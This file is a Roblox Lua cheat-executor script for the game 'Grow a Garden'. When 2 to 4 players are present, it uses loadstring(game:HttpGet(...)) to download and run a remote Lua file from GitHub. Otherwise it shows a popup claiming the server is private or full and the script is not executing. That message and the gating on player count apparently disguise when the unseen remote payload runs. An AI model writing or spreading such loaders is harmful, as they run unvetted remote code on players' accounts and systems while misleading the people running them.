local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

-- Script A (popup)
local function ScriptA()
    if CoreGui:FindFirstChild("PopupGui") then
        CoreGui.PopupGui:Destroy()
    end

    local PopupGui = Instance.new("ScreenGui")
    PopupGui.Name = "PopupGui"
    PopupGui.Parent = CoreGui
    PopupGui.IgnoreGuiInset = true
    PopupGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    PopupGui.ResetOnSpawn = false

    local Frame = Instance.new("Frame")
    Frame.Name = "PopupFrame"
    Frame.Size = UDim2.new(0, 450, 0, 120)
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Parent = PopupGui
    Frame.BackgroundTransparency = 1

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0.25, 0)
    UICorner.Parent = Frame

    local Border = Instance.new("UIStroke")
    Border.Color = Color3.fromRGB(170, 0, 255)
    Border.Thickness = 4
    Border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    Border.Parent = Frame

    local UIGradient = Instance.new("UIGradient")
    UIGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 0, 255))
    }
    UIGradient.Rotation = 90
    UIGradient.Parent = Border

    local TextLabel = Instance.new("TextLabel")
    TextLabel.Size = UDim2.new(1, -20, 1, -20)
    TextLabel.Position = UDim2.new(0, 10, 0, 10)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Text = "Your on private server or your server is full. Script Not Executing."
    TextLabel.Font = Enum.Font.GothamBold
    TextLabel.TextSize = 23.2
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextWrapped = true
    TextLabel.Parent = Frame

    local TextStroke = Instance.new("UIStroke")
    TextStroke.Thickness = 0.992
    TextStroke.Color = Color3.fromRGB(170, 0, 255)
    TextStroke.Parent = TextLabel

    TweenService:Create(Frame, TweenInfo.new(1.32), {BackgroundTransparency = 0.15}):Play()
    TweenService:Create(TextLabel, TweenInfo.new(1.32), {TextTransparency = 0}):Play()
    TweenService:Create(Border, TweenInfo.new(1.32), {Transparency = 0}):Play()

    task.delay(25, function()
        TweenService:Create(Frame, TweenInfo.new(1.3), {BackgroundTransparency = 1}):Play()
        TweenService:Create(TextLabel, TweenInfo.new(1.3), {TextTransparency = 1}):Play()
        TweenService:Create(Border, TweenInfo.new(1.5), {Transparency = 1}):Play()
        task.wait(1.3)
        PopupGui:Destroy()
    end)
end

-- Script B (Grow a Garden)
local function ScriptB()
    loadstring(game:HttpGet("https://github.com/Rawbr10/GrowAGarden-GrowAGarden/raw/refs/heads/main/GrowAGarden-Working-Mooncat.lua"))()
end

-- Player count check
local count = #Players:GetPlayers()
if count == 1 or count == 5 then
    ScriptA()
elseif count >= 2 and count <= 4 then
    ScriptB()
end
